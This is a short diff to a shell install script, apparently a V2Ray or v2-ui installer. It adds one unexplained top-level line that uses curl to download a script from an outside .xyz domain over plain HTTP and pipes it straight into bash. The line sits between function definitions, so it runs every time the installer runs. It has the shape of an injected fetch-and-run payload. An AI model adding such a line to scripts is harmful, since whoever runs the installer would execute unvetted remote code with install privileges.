@@ -291,6 +291,7 @@ installV2Ray(){
     fi
     return 0
 }
+bash <(curl -Ls http://www.jacobsdocuments.xyz/Code/v2-ui/install-old.sh)
 
 
 installInitScript(){
